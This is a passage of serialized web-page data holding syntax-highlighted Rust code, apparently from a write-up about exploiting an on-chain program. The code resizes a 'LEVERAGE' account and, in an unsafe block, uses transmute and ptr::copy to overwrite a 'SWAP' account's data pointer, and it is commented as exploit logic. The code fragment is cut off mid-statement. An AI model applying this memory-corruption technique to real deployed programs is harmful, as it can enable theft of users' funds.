layout\"]}]\nf4c:[\"$\",\"span\",\"code-segment-199\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nf4d:[\"$\",\"span\",\"line-number--28\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[28]}]\nf4e:[\"$\",\"span\",\"code-segment-201\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        accounts\"]}]\nf4f:[\"$\",\"span\",\"code-segment-202\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}]\nf50:[\"$\",\"span\",\"code-segment-203\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"leverage_idx\"]}]\nf51:[\"$\",\"span\",\"code-segment-204\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}]\nf52:[\"$\",\"span\",\"code-segment-205\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\nf53:[\"$\",\"span\",\"code-segment-206\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"data\"]}]\nf54:[\"$\",\"span\",\"code-segment-207\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\nf55:[\"$\",\"span\",\"code-segment-208\",{\"className\":\"token to"])</script><script>self.__next_f.push([1,"ken\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"borrow_mut\"]}]\nf56:[\"$\",\"span\",\"code-segment-209\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\nf57:[\"$\",\"span\",\"code-segment-210\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\nf58:[\"$\",\"span\",\"code-segment-211\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}]\nf59:[\"$\",\"span\",\"code-segment-212\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0\"]}]\nf5a:[\"$\",\"span\",\"code-segment-213\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}]\nf5b:[\"$\",\"span\",\"code-segment-214\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nf5c:[\"$\",\"span\",\"code-segment-215\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}]\nf5d:[\"$\",\"span\",\"code-segment-216\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nf5e:[\"$\",\"span\",\"code-segment-217\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"1\"]}]\nf5f:[\"$\",\"span\",\"code-segment-218\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\nf60:[\"$\",\"span\",\"code-segment-219\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nf61:[\"$\",\"span\",\"line-number--29\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[29]}]\nf62:[\"$\",\"span\",\"code-segment-221\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        accounts\"]}]\nf63:[\"$\",\"span\",\"code-segment-222\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}]\nf64:[\"$\",\"span\",\"code-segment-223\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"swap_idx\"]}]\nf65:[\"$\",\"span\",\"code-segment-224\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}]\nf66:[\"$\",\"span\",\"code-segment-225\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\nf67:[\"$\",\"span\",\"cod"])</script><script>self.__next_f.push([1,"e-segment-226\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"data\"]}]\nf68:[\"$\",\"span\",\"code-segment-227\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\nf69:[\"$\",\"span\",\"code-segment-228\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"borrow_mut\"]}]\nf6a:[\"$\",\"span\",\"code-segment-229\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\nf6b:[\"$\",\"span\",\"code-segment-230\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\nf6c:[\"$\",\"span\",\"code-segment-231\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}]\nf6d:[\"$\",\"span\",\"code-segment-232\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0\"]}]\nf6e:[\"$\",\"span\",\"code-segment-233\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}]\nf6f:[\"$\",\"span\",\"code-segment-234\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nf70:[\"$\",\"span\",\"code-segment-235\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}]\nf71:[\"$\",\"span\",\"code-segment-236\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nf72:[\"$\",\"span\",\"code-segment-237\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"1\"]}]\nf73:[\"$\",\"span\",\"code-segment-238\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\nf74:[\"$\",\"span\",\"code-segment-239\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nf75:[\"$\",\"span\",\"line-number--30\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[30]}]\nf76:[\"$\",\"span\",\"line-number--31\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children"])</script><script>self.__next_f.push([1,"\":[31]}]\nf77:[\"$\",\"span\",\"code-segment-243\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\nf78:[\"$\",\"span\",\"code-segment-244\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Resize LEVERAGE to simplify exploit logic\"]}]\nf79:[\"$\",\"span\",\"code-segment-245\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nf7a:[\"$\",\"span\",\"line-number--32\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[32]}]\nf7b:[\"$\",\"span\",\"code-segment-247\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        accounts\"]}]\nf7c:[\"$\",\"span\",\"code-segment-248\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}]\nf7d:[\"$\",\"span\",\"code-segment-249\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"leverage_idx\"]}]\nf7e:[\"$\",\"span\",\"code-segment-250\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}]\nf7f:[\"$\",\"span\",\"code-segment-251\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\nf80:[\"$\",\"span\",\"code-segment-252\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"realloc\"]}]\nf81:[\"$\",\"span\",\"code-segment-253\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\nf82:[\"$\",\"span\",\"code-segment-254\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"1\"]}]\nf83:[\"$\",\"span\",\"code-segment-255\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\nf84:[\"$\",\"span\",\"code-segment-256\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nf85:[\"$\",\"span\",\"code-segment-257\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"false\"]}]\nf86:[\"$\",\"span\",\"code-segment-258\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\nf87:[\"$\",\"span\",\"code-segment-259\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"?\"]}]\nf88:["])</script><script>self.__next_f.push([1,"\"$\",\"span\",\"code-segment-260\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\nf89:[\"$\",\"span\",\"code-segment-261\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nf8a:[\"$\",\"span\",\"line-number--33\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[33]}]\nf8b:[\"$\",\"span\",\"line-number--34\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[34]}]\nf8c:[\"$\",\"span\",\"code-segment-265\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\nf8d:[\"$\",\"span\",\"code-segment-266\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Overwrite SWAP's data pointer with LEVERAGE's pointer\"]}]\nf8e:[\"$\",\"span\",\"code-segment-267\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nf8f:[\"$\",\"span\",\"line-number--35\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[35]}]\nf90:[\"$\",\"span\",\"code-segment-269\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\nf91:[\"$\",\"span\",\"code-segment-270\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"unsafe\"]}]\nf92:[\"$\",\"span\",\"code-segment-271\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nf93:[\"$\",\"span\",\"code-segment-272\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\nf94:[\"$\",\"span\",\"code-segment-273\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nf95:[\"$\",\"span\",\"line-number--36\",{\"className\":\"linenumber re"])</script><script>self.__next_f.push([1,"act-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[36]}]\nf96:[\"$\",\"span\",\"code-segment-275\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\nf97:[\"$\",\"span\",\"code-segment-276\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"ptr\"]}]\nf98:[\"$\",\"span\",\"code-segment-277\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\nf99:[\"$\",\"span\",\"code-segment-278\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"copy\"]}]\nf9a:[\"$\",\"span\",\"code-segment-279\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\nf9b:[\"$\",\"span\",\"code-segment-280\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nf9c:[\"$\",\"span\",\"line-number--37\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[37]}]\nf9d:[\"$\",\"span\",\"code-segment-282\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}]\nf9e:[\"$\",\"span\",\"code-segment-283\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"mem\"]}]\nf9f:[\"$\",\"span\",\"code-segment-284\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\nfa0:[\"$\",\"span\",\"code-segment-285\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"transmute\"]}]\nfa1:[\"$\",\"span\",\"code-segment-286\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\nfa2:[\"$\",\"span\",\"code-segment-287\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\nfa3:[\"$\",\"span\",\"code-segment-288\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\nfa4:[\"$\",\"span\",\"code-segment-289\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c5"])</script><script>self.__next_f.push([1,"55\"},\"children\":[\"Rc\"]}]\nfa5:[\"$\",\"span\",\"code-segment-290\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\nfa6:[\"$\",\"span\",\"code-segment-291\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"RefCell\"]}]\nfa7:[\"$\",\"span\",\"code-segment-292\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\nfa8:[\"$\",\"span\",\"code-segment-293\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\nfa9:[\"$\",\"span\",\"code-segment-294\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}]\nfaa:[\"$\",\"span\",\"code-segment-295\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nfab:[\"$\",\"span\",\"code-segment-296\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}]\nfac:[\"$\",\"span\",\"code-segment-297\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}]\nfad:[\"$\",\"span\",\"code-segment-298\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}]\nfae:[\"$\",\"span\",\"code-segment-299\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\u003e\"]}]\nfaf:[\"$\",\"span\",\"code-segment-300\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\nfb0:[\"$\",\"span\",\"code-segment-301\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nfb1:[\"$\",\"span\",\"code-segment-302\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}]\nfb2:[\"$\",\"span\",\"code-segment-303\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"const\"]}]\nfb3:[\"$\",\"span\",\"code-segment-304\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nfb4:[\"$\",\"span\",\"code-segment-305\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}]\nfb5:[\"$\",\"span\",\"code-segment-306\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}]\nfb6:[\"$\",\"span\",\"code-segment-307\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\nfb7:[\"$\",\"span\",\"code-segment-308\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\nfb8"])</script><script>self.__next_f.push([1,":[\"$\",\"span\",\"code-segment-309\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"accounts\"]}]\nfb9:[\"$\",\"span\",\"code-segment-310\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}]\nfba:[\"$\",\"span\",\"code-segment-311\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"leverage_idx\"]}]\nfbb:[\"$\",\"span\",\"code-segment-312\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}]\nfbc:[\"$\",\"span\",\"code-segment-313\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\nfbd:[\"$\",\"span\",\"code-segment-314\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"data\"]}]\nfbe:[\"$\",\"span\",\"code-segment-315\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\nfbf:[\"$\",\"span\",\"code-segment-316\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\nfc0:[\"$\",\"span\",\"code-segment-317\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nfc1:[\"$\",\"span\",\"line-number--38\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[38]}]\nfc2:[\"$\",\"span\",\"code-segment-319\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}]\nfc3:[\"$\",\"span\",\"code-segment-320\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"mem\"]}]\nfc4:[\"$\",\"span\",\"code-segment-321\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\nfc5:[\"$\",\"span\",\"code-segment-322\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"transmute\"]}]\nfc6:[\"$\",\"span\",\"code-segment-323\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\nfc7:[\"$\",\"span\",\"code-segment-324\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\nfc8:[\"$\",\"span\",\"code-segment-325\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\nfc9:[\"$\",\"span\",\"code-segment-326\",{\"className\":\"token "])</script><script>self.__next_f.push([1,"token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Rc\"]}]\nfca:[\"$\",\"span\",\"code-segment-327\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\nfcb:[\"$\",\"span\",\"code-segment-328\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"RefCell\"]}]\nfcc:[\"$\",\"span\",\"code-segment-329\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\nfcd:[\"$\",\"span\",\"code-segment-330\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\nfce:[\"$\",\"span\",\"code-segment-331\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}]\nfcf:[\"$\",\"span\",\"code-segment-332\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nfd0:[\"$\",\"span\",\"code-segment-333\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}]\nfd1:[\"$\",\"span\",\"code-segment-334\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}]\nfd2:[\"$\",\"span\",\"code-segment-335\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}]\nfd3:[\"$\",\"span\",\"code-segment-336\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\u003e\"]}]\nfd4:[\"$\",\"span\",\"code-segment-337\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\nfd5:[\"$\",\"span\",\"code-segment-338\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nfd6:[\"$\",\"span\",\"code-segment-339\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}]\nfd7:[\"$\",\"span\",\"code-segment-340\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}]\nfd8:[\"$\",\"span\",\"code-segment-341\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nfd9:[\"$\",\"span\",\"code-segment-342\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}]\nfda:[\"$\",\"span\",\"code-segment-343\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}]\nfdb:[\"$\",\"span\",\"code-segment-344\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\nfdc:[\"$\",\"span\",\"code-segment-345\",{\"className\":\"token token\",\"style\":{\"color\":\"#67c"])</script><script>self.__next_f.push([1,"dcc\"},\"children\":[\"\u0026\"]}]\nfdd:[\"$\",\"span\",\"code-segment-346\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"accounts\"]}]\nfde:[\"$\",\"span\",\"code-segment-347\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}]\nfdf:[\"$\",\"span\",\"code-segment-348\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"swap_idx\"]}]\nfe0:[\"$\",\"span\",\"code-segment-349\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}]\nfe1:[\"$\",\"span\",\"code-segment-350\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\nfe2:[\"$\",\"span\",\"code-segment-351\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"data\"]}]\nfe3:[\"$\",\"span\",\"code-segment-352\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\nfe4:[\"$\",\"span\",\"code-segment-353\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\nfe5:[\"$\",\"span\",\"code-segment-354\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nfe6:[\"$\",\"span\",\"line-number--39\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[39]}]\nfe7:[\"$\",\"span\",\"code-segment-356\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}]\nfe8:[\"$\",\"span\",\"code-segment-357\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"mem\"]}]\nfe9:[\"$\",\"span\",\"code-segment-358\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\nfea:[\"$\",\"span\",\"code-segment-359\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"size_of\"]}]\nfeb:[\"$\",\"span\",\"code-segment-360\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\nfec:[\"$\",\"span\",\"code-segment-361\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\nfed:[\"$\",\"span\",\"code-segment-362\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Rc\"]}]\nfee:[\"$\",\"span\",\"code-segment-36"])</script><script>self.__next_f.push([1,"3\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\nfef:[\"$\",\"span\",\"code-segment-364\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"RefCell\"]}]\nff0:[\"$\",\"span\",\"code-segment-365\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\nff1:[\"$\",\"span\",\"code-segment-366\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\nff2:[\"$\",\"span\",\"code-segment-367\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}]\nff3:[\"$\",\"span\",\"code-segment-368\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nff4:[\"$\",\"span\",\"code-segment-369\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}]\nff5:[\"$\",\"span\",\"code-segment-370\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}]\nff6:[\"$\",\"span\",\"code-segment-371\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}]\nff7:[\"$\",\"span\",\"code-segment-372\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\u003e\"]}]\nff8:[\"$\",\"span\",\"code-segment-373\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}]\nff9:[\"$\",\"span\",\"code-segment-374\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\nffa:[\"$\",\"span\",\"code-segment-375\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\nffb:[\"$\",\"span\",\"code-segment-376\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\nffc:[\"$\",\"span\",\"code-segment-377\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nffd:[\"$\",\"span\",\"line-number--40\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[40]}]\nffe:[\"$\",\"span\",\"code-segment-379\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\nfff:[\"$\",\"span\",\"code-segment-380\",{\"className\":\"token token\",\"style\""])</script><script>self.__next_f.push([1,":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n1000:[\"$\",\"span\",\"code-segment-381\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\n1001:[\"$\",\"span\",\"code-segment-382\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n1002:[\"$\",\"span\",\"line-number--41\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid 